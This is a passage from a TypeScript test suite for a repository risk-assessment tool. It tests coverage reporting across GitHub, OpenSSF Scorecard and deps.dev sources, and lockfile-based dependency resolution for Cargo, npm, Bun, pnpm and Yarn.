    expect(mixedUnverifiedAbsentAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "OBSERVED", weight: 1 });

    const mixedError = repositoryEvidenceWith([coordinate, exactCoordinate("provenance-error")]);
    const mixedErrorDepsDev = fakeDepsDev(() => {});
    mixedErrorDepsDev.packageVersion = async item => ({
      observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state: item.name === "provenance-error" ? "ERROR" : "VERIFIED", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    });
    const mixedErrorAssessment = await repositoryOmni(mixedError, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, mixedErrorDepsDev).repositoryRisk("acme", "demo");
    expect(mixedErrorAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });

    const mixedProviderFailure = repositoryEvidenceWith([coordinate, exactCoordinate("provider-failure")]);
    const mixedProviderFailureDepsDev = fakeDepsDev(() => {});
    mixedProviderFailureDepsDev.packageVersion = async item => {
      if (item.name === "provider-failure") throw new Error("deps_dev_timeout");
      return { observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state: "VERIFIED", source: "deps.dev" }] }, evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} } };
    };
    const mixedProviderFailureAssessment = await repositoryOmni(mixedProviderFailure, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, mixedProviderFailureDepsDev).repositoryRisk("acme", "demo");
    expect(mixedProviderFailureAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });

    const absent = repositoryEvidenceWith([coordinate]);
    const absentDepsDev = fakeDepsDev(() => {});
    absentDepsDev.packageVersion = async item => ({
      observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state: "UNAVAILABLE", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    });
    const absentAssessment = await repositoryOmni(absent, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, absentDepsDev).repositoryRisk("acme", "demo");
    expect(absentAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "ABSENT", weight: 1 });

    const error = repositoryEvidenceWith([coordinate]);
    const errorDepsDev = fakeDepsDev(() => {});
    errorDepsDev.packageVersion = async item => ({
      observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state: "ERROR", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    });
    const errorAssessment = await repositoryOmni(error, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, errorDepsDev).repositoryRisk("acme", "demo");
    expect(errorAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });

    const failed = repositoryEvidenceWith([coordinate]);
    const failedDepsDev = fakeDepsDev(() => {});
    failedDepsDev.packageVersion = async () => { throw new Error("deps_dev_timeout"); };
    const failedAssessment = await repositoryOmni(failed, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, failedDepsDev).repositoryRisk("acme", "demo");
    expect(failedAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 });

    const deferred = repositoryEvidenceWith(Array.from({ length: 25 }, (_, index) => exactCoordinate(`deferred-${index}`)));
    const deferredAssessment = await repositoryOmni(deferred, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, fakeDepsDev(() => {})).repositoryRisk("acme", "demo");
    expect(deferredAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
  });

  test("distinguishes resolver execution from unsupported and not-applicable states", async () => {
    const successful = repositoryEvidenceWith([exactCoordinate("resolved")]);
    const successfulAssessment = await repositoryOmni(successful, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(successfulAssessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "OBSERVED", weight: 1 });

    const partial = repositoryEvidenceWith([]);
    partial.dependencies.unresolved = [{ ecosystem: "NPM", name: "unresolved", requirement: "^1.0.0", manifestPath: "package.json", workspacePath: "." }];
    partial.coverage.limitations = ["dependency_lock_missing:package.json"];
    const partialAssessment = await repositoryOmni(partial, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(partialAssessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "UNKNOWN", weight: 1 });

    const unsupported = repositoryEvidenceWith([]);
    unsupported.coverage.limitations = ["dependency_resolution_unsupported:CARGO"];
    const unsupportedAssessment = await repositoryOmni(unsupported, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(unsupportedAssessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });

    const notApplicable = await repositoryOmni(repositoryEvidenceWith([]), threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(notApplicable.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 });
  });

  test("keeps not_indexed Scorecard as partial uncertainty without inflating observed risk", async () => {
    const repositoryEvidence = repositoryEvidenceWith([]);
    const notIndexed = {
      async repository() {
        return {
          status: "not_indexed" as const,
          diagnostic: {
            httpStatus: 404,
            host: "api.scorecard.dev",
            mode: "latest" as const,
            repository: repositoryEvidence.target.repository,
            reason: "missing_result"
          }
        };
      }
    };
    const assessment = await repositoryOmni(repositoryEvidence, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), notIndexed).repositoryRisk("acme", "demo");

    expect(assessment.dimensions.repositorySecurityPractices).toBe("unknown");
    expect(assessment.evidenceCoverage).toBeGreaterThan(0);
    expect(assessment.riskScore).toBe(0);
    expect(assessment.scoreStatus).toBe("measured_partial");
    expect(assessment.recommendation).toBe("manual_review");
    expect(assessment.sourceErrors).toEqual(["OpenSSF Scorecard: not_indexed (missing_result; HTTP 404 api.scorecard.dev; mode=latest; repository=github.com/acme/demo)"]);
    expect(assessment.coverage).toMatchObject({ modelVersion: "repository-coverage-v1", resolvedWeight: 1, applicableWeight: 2 });
    expect(assessment.coverage?.sources).toEqual(expect.arrayContaining([
      { source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 },
      { source: "OpenSSF Scorecard", execution: "QUERIED", status: "UNKNOWN", weight: 1 },
      { source: "Dependency Resolution", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 },
      { source: "deps.dev Provenance", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 },
      { source: "Threat Intelligence", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 }
    ]));
    expect(assessment.evidence.some(item => item.kind === "repository_primary_evidence")).toBe(true);
    expect(assessment.evidence.some(item => item.kind === "repository_security_practices")).toBe(false);
  });

  test("keeps an OpenSSF outage outside the observed repository risk score", async () => {
    const repositoryEvidence = repositoryEvidenceWith([]);
    const unavailable = {
      async repository() {
        return {
          status: "unavailable" as const,
          diagnostic: {
            host: "api.scorecard.dev",
            mode: "latest" as const,
            repository: repositoryEvidence.target.repository,
            reason: "timeout"
          }
        };
      }
    };
    const assessment = await repositoryOmni(repositoryEvidence, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), unavailable).repositoryRisk("acme", "demo");

    expect(assessment.riskScore).toBe(0);
    expect(assessment.scoreStatus).toBe("measured_partial");
    expect(assessment.coverage?.sources).toContainEqual({ source: "OpenSSF Scorecard", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 });
  });

  test("reports insufficient evidence and manual review when all applicable repository evidence is unavailable", () => {
    const result = new RiskEngine().assess({
      subject: { type: "repository", id: "github.com/acme/demo" },
      coverage: {
        modelVersion: "repository-coverage-v1",
        sources: [
          { source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 },
          { source: "OpenSSF Scorecard", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 },
          { source: "Dependency Resolution", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 },
          { source: "deps.dev Provenance", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 },
          { source: "Threat Intelligence", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 }
        ]
      },
      evidence: [],
      sourceErrors: ["GitHub: unavailable", "OpenSSF Scorecard: timeout", "Threat intelligence: unavailable"]
    });

    expect(result.scoreStatus).toBe("insufficient_evidence");
    expect(result.recommendation).toBe("manual_review");
    expect(result.riskScore).toBe(0);
    expect(result.evidenceCoverage).toBe(0);
  });

  test("uses not_applicable for repository-only dimensions and excludes it from coverage denominator", () => {
    const result = new RiskEngine().assess({
      subject: { type: "repository", id: "github.com/acme/demo" },
      scorecard: 9.5,
      coverage: {
        modelVersion: "repository-coverage-v1",
        sources: [
          { source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 2 },
          { source: "OpenSSF Scorecard", execution: "QUERIED", status: "ABSENT", weight: 3 },
          { source: "Dependency Resolution", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 5 },
          { source: "deps.dev Provenance", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 7 },
          { source: "Threat Intelligence", execution: "QUERIED", status: "UNAVAILABLE", weight: 11 }
        ]
      },
      evidence: []
    });

    expect(result.coverage).toMatchObject({ resolvedWeight: 5, applicableWeight: 16 });
    expect(result.evidenceCoverage).toBe(0.31);
    expect(result.dimensions).toMatchObject({
      packageSupplyChain: "not_applicable",
      serviceIdentity: "not_applicable",
      paymentConfigurationRisk: "not_applicable",
      endpointOperationalRisk: "not_applicable",
      repositorySecurityPractices: "low",
      maliciousInfrastructure: "unknown"
    });
  });
  test("maps real Cargo provider evidence without relabeling GitHub coverage", async () => {
    const evidence = await realGithubEvidence([{ path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 }], { "Cargo.toml": "[dependencies]\nserde = \"1\"\n" });
    const assessment = await repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    const detail = assessment.evidence.find(item => item.kind === "repository_primary_evidence")?.detail ?? {};
    expect(detail.limitations).toEqual([]);
    expect(detail.collectorErrors).toEqual([]);
  });

  test("maps a real npm manifest without its governing lockfile as resolver uncertainty", async () => {
    const evidence = await realGithubEvidence([{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }], { "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }) });
    const assessment = await repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
  });

  test("maps a real complete repository with no dependency manifests as not applicable", async () => {
    const evidence = await realGithubEvidence([{ path: "README.md", type: "blob", sha: packageBlob, size: 100 }], {});
    const assessment = await repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "NOT_QUERIED", status: "NOT_APPLICABLE", weight: 1 });
  });

  test("does not claim no dependencies when the real GitHub tree is partial", async () => {
    const evidence = await realGithubEvidence([{ path: "README.md", type: "blob", sha: packageBlob, size: 100 }], {}, true);
    const assessment = await repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Threat Intelligence", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
  });

  test("resolves direct Cargo dependencies from Cargo.lock, including renamed crates", async () => {
    const evidence = await realGithubEvidence([
      { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
      { path: "Cargo.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "Cargo.toml": "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = \"1\"\nrenamed = { package = \"real-crate\", version = \"0.9\" }\nlocal-crate = { path = \"../local-crate\" }\n\n[dev-dependencies]\ntempfile = \"3\"\n",
      "Cargo.lock": "version = 3\n\n[[package]]\nname = \"demo\"\nversion = \"0.1.0\"\ndependencies = [\n \"real-crate\",\n \"serde\",\n \"tempfile\",\n]\n\n[[package]]\nname = \"real-crate\"\nversion = \"0.9.4\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.219\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"tempfile\"\nversion = \"3.20.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n"
    });
    expect(evidence.dependencies.exact).toEqual(expect.arrayContaining([
      { ecosystem: "CARGO", name: "serde", version: "1.0.219", sourcePath: "Cargo.lock", manifestPath: "Cargo.toml", workspacePath: "." },
      { ecosystem: "CARGO", name: "real-crate", version: "0.9.4", sourcePath: "Cargo.lock", manifestPath: "Cargo.toml", workspacePath: "." },
      { ecosystem: "CARGO", name: "tempfile", version: "3.20.0", sourcePath: "Cargo.lock", manifestPath: "Cargo.toml", workspacePath: "." }
    ]));
    expect(evidence.dependencies.exact.some(item => item.name === "local-crate")).toBe(false);
    expect(evidence.dependencies.unresolved).toEqual([]);
  });

  test("does not guess Cargo versions without Cargo.lock and excludes local crates", async () => {
    const evidence = await realGithubEvidence([{ path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 }], {
      "Cargo.toml": "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = \"1\"\nlocal-crate = { path = \"../local-crate\" }\nworkspace-crate = { workspace = true }\n"
    });
    expect(evidence.dependencies.exact).toEqual([]);
    expect(evidence.dependencies.unresolved).toEqual(expect.arrayContaining([
      { ecosystem: "CARGO", name: "serde", requirement: "1", manifestPath: "Cargo.toml", workspacePath: "." },
      { ecosystem: "CARGO", name: "workspace-crate", requirement: "<unspecified>", manifestPath: "Cargo.toml", workspacePath: "." }
    ]));
    expect(evidence.dependencies.unresolved.some(item => item.name === "local-crate")).toBe(false);
    expect(evidence.coverage.limitations).toContain("dependency_lock_missing:Cargo.toml");
  });

  test("resolves Cargo workspace-inherited registry dependencies and excludes inherited local crates", async () => {
    const evidence = await realGithubEvidence([
      { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
      { path: "Cargo.lock", type: "blob", sha: packageBlob, size: 100 },
      { path: "crates/app/Cargo.toml", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "Cargo.toml": "[workspace]\nmembers = [\"crates/app\"]\n[workspace.dependencies]\nserde = \"1\"\nlocal-crate = { path = \"crates/local\" }\n",
      "Cargo.lock": "version = 3\n\n[[package]]\nname = \"app\"\nversion = \"0.1.0\"\ndependencies = [\n \"serde\",\n]\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.219\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n",
      "crates/app/Cargo.toml": "[package]\nname = \"app\"\nversion = \"0.1.0\"\n[dependencies]\nserde = { workspace = true }\nlocal-crate = { workspace = true }\n"
    });
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "CARGO", name: "serde", version: "1.0.219", sourcePath: "Cargo.lock", manifestPath: "crates/app/Cargo.toml", workspacePath: "crates/app" }]);
    expect(evidence.dependencies.unresolved.some(item => item.name === "local-crate")).toBe(false);
  });

  test("resolves nested npm workspaces from a governing root package-lock.json", async () => {
    const lock = JSON.stringify({ lockfileVersion: 3, packages: {
      "": { workspaces: ["packages/*"] },
      "packages/app": { dependencies: { demo: "^1.0.0" } },
      "node_modules/demo": { version: "1.2.3" }
    } });
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "packages/app/package.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ workspaces: ["packages/*"] }),
      "package-lock.json": lock,
      "packages/app/package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } })
    });
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "demo", version: "1.2.3", sourcePath: "package-lock.json", manifestPath: "packages/app/package.json", workspacePath: "packages/app" }]);
  });

  test("supports npm-shrinkwrap.json as a governing lockfile", async () => {
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "npm-shrinkwrap.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2.0.0" } }),
      "npm-shrinkwrap.json": JSON.stringify({ lockfileVersion: 3, packages: { "": { dependencies: { demo: "^2.0.0" } }, "node_modules/demo": { version: "2.4.1" } } })
    });
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "demo", version: "2.4.1", sourcePath: "npm-shrinkwrap.json", manifestPath: "package.json", workspacePath: "." }]);
  });

  test("resolves nested Bun workspace dependencies from the root bun.lock", async () => {
    const bunLock = JSON.stringify({ lockfileVersion: 1, workspaces: {
      "": { name: "demo", workspaces: ["packages/*"] },
      "packages/app": { name: "app", dependencies: { demo: "^1.0.0" } }
    }, packages: { demo: ["demo@1.3.0", "", {}, "sha512-demo"] } });
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "bun.lock", type: "blob", sha: packageBlob, size: 100 },
      { path: "packages/app/package.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ workspaces: ["packages/*"] }),
      "bun.lock": bunLock,
      "packages/app/package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } })
    });
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "demo", version: "1.3.0", sourcePath: "bun.lock", manifestPath: "packages/app/package.json", workspacePath: "packages/app" }]);
  });

  test("resolves nested pnpm importers and excludes workspace references", async () => {
    const pnpmLock = "lockfileVersion: '9.0'\nimporters:\n  packages/app:\n    dependencies:\n      demo:\n        specifier: ^1.0.0\n        version: 1.4.0\n      local-package:\n        specifier: workspace:*\n        version: link:../local-package\npackages:\n  demo@1.4.0:\n    resolution: {integrity: sha512-demo}\nsnapshots:\n  demo@1.4.0: {}\n";
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "pnpm-lock.yaml", type: "blob", sha: packageBlob, size: 100 },
      { path: "packages/app/package.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ workspaces: ["packages/*"] }),
      "pnpm-lock.yaml": pnpmLock,
      "packages/app/package.json": JSON.stringify({ dependencies: { demo: "^1.0.0", "local-package": "workspace:*" } })
    });
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "demo", version: "1.4.0", sourcePath: "pnpm-lock.yaml", manifestPath: "packages/app/package.json", workspacePath: "packages/app" }]);
    expect(evidence.dependencies.exact.some(item => item.name === "local-package")).toBe(false);
  });

  test("resolves Yarn classic selectors, including multiple selectors and scoped names", async () => {
    const yarnLock = "# yarn lockfile v1\n\"@scope/demo@^1.0.0\", \"@scope/demo@~1.0.0\":\n  version \"1.5.0\"\n  resolved \"https://registry.yarnpkg.com/@scope/demo/-/demo-1.5.0.tgz\"\n";
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "yarn.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { "@scope/demo": "^1.0.0" } }),
      "yarn.lock": yarnLock
    });
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "@scope/demo", version: "1.5.0", sourcePath: "yarn.lock", manifestPath: "package.json", workspacePath: "." }]);
  });

  test("fails closed for unsupported Yarn formats, ambiguous lock roots, malformed locks, and local workspace references", async () => {
    const unsupportedYarn = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "yarn.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0", local: "workspace:*" } }),
      "yarn.lock": "__metadata:\n  version: 6\n"
    });
    expect(unsupportedYarn.dependencies.exact).toEqual([]);
    expect(unsupportedYarn.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "demo", requirement: "^1.0.0", sourcePath: "yarn.lock", manifestPath: "package.json", workspacePath: "." }]);
    expect(unsupportedYarn.coverage.limitations).toContain("dependency_lock_unsupported:yarn.lock");

    const ambiguous = await realGithubEvidence([
      { path: "packages/app/package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "packages/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "packages/app/package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }),
      "package-lock.json": JSON.stringify({ packages: { "node_modules/demo": { version: "1.0.0" } } }),
      "packages/package-lock.json": JSON.stringify({ packages: { "node_modules/demo": { version: "2.0.0" } } })
    });
    expect(ambiguous.dependencies.exact).toEqual([]);
    expect(ambiguous.coverage.limitations).toContain("dependency_lock_association_ambiguous:packages/app/package.json");

    const malformed = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], { "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }), "package-lock.json": "{not-json" });
    expect(malformed.dependencies.exact).toEqual([]);
    expect(malformed.dependencies.unresolved[0]).toMatchObject({ ecosystem: "NPM", name: "demo" });

    const local = await realGithubEvidence([{ path: "package.json", type: "blob", sha: packageBlob, size: 100 }], {
      "package.json": JSON.stringify({ dependencies: { local: "workspace:*", linked: "link:../linked", filed: "file:../filed" } })
    });
    expect(local.dependencies.exact).toEqual([]);
    expect(local.dependencies.unresolved).toEqual([]);
  });

  test("resolves a valid lockfile above the security budget through GitHub raw media within the dependency budget", async () => {
    const lock = JSON.stringify({ lockfileVersion: 3, metadata: "x".repeat(1_200_000), packages: { "": { dependencies: { demo: "^1.0.0" } }, "node_modules/demo": { version: "1.9.0" } } });
    const rawAccepts: string[] = [];
    const evidence = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: lock.length }
    ], { "package.json": JSON.stringify({ dependencies: { demo: "^1.0.0" } }), "package-lock.json": lock }, false, rawAccepts);
    expect(evidence.dependencies.exact).toEqual([{ ecosystem: "NPM", name: "demo", version: "1.9.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }]);
    expect(rawAccepts).toContain("application/vnd.github.raw+json");
    expect(evidence.securityFiles.find(file => file.path === "package-lock.json")?.status).toBe("oversized");
    expect(evidence.coverage.limitations.some(item => item.startsWith("dependency_lock_oversized"))).toBe(false);
    const assessment = await repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "QUERIED", status: "OBSERVED", weight: 1 });
  });

  test("fails closed when lock declarations or selectors do not bind to the current manifest", async () => {
    const staleNpm = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2.0.0" } }),
      "package-lock.json": JSON.stringify({ packages: { "": { dependencies: { demo: "^1.0.0" } }, "node_modules/demo": { version: "1.9.0" } } })
    });
    expect(staleNpm.dependencies.exact).toEqual([]);
    expect(staleNpm.dependencies.unresolved[0]).toMatchObject({ ecosystem: "NPM", name: "demo", requirement: "^2.0.0" });

    const missingNpmMetadata = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2.0.0" } }),
      "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/demo": { version: "1.9.0" } } })
    });
    expect(missingNpmMetadata.dependencies.exact).toEqual([]);

    const staleBun = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "bun.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2.0.0" } }),
      "bun.lock": JSON.stringify({ lockfileVersion: 1, workspaces: { "": { dependencies: { demo: "^1.0.0" } } }, packages: { demo: ["demo@1.9.0", "", {}, "sha512-demo"] } })
    });
    expect(staleBun.dependencies.exact).toEqual([]);

    const missingBunMetadata = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "bun.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2.0.0" } }),
      "bun.lock": JSON.stringify({ lockfileVersion: 1, packages: { demo: ["demo@1.9.0", "", {}, "sha512-demo"] } })
    });
    expect(missingBunMetadata.dependencies.exact).toEqual([]);

    const stalePnpm = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "pnpm-lock.yaml", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2" } }),
      "pnpm-lock.yaml": "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      demo:\n        specifier: ^1\n        version: 1.9.0\npackages:\n  demo@1.9.0: {}\nsnapshots:\n  demo@1.9.0: {}\n"
    });
    expect(stalePnpm.dependencies.exact).toEqual([]);

    const wrongYarn = await realGithubEvidence([
      { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
      { path: "yarn.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "package.json": JSON.stringify({ dependencies: { demo: "^2.0.0" } }),
      "yarn.lock": "# yarn lockfile v1\n\"demo@^1.0.0\":\n  version \"1.9.0\"\n"
    });
    expect(wrongYarn.dependencies.exact).toEqual([]);
    expect(wrongYarn.dependencies.unresolved[0]).toMatchObject({ name: "demo" });
  });

  test("requires Cargo direct edges and preserves actual renamed crate identity", async () => {
    const transitiveOnly = await realGithubEvidence([
      { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
      { path: "Cargo.lock", type: "blob", sha: packageBlob, size: 100 }
    ], {
      "Cargo.toml": "[package]\nname = \"app\"\nversion = \"0.1.0\"\n[dependencies]\nserde = \"1\"\n",
      "Cargo.lock": "version = 3\n[[package]]\nname = \"app\"\nversion = \"0.1.0\"\n\n[[package]]\nname = \"serde\"\nversion = \"1.0.219\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n"
    });
    expect(transitiveOnly.dependencies.exact).toEqual([]);
    expect(transitiveOnly.dependencies.unresolved[0]).toMatchObject({ ecosystem: "CARGO", name: "serde" });

    const renamed = await realGithubEvidence([
      { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
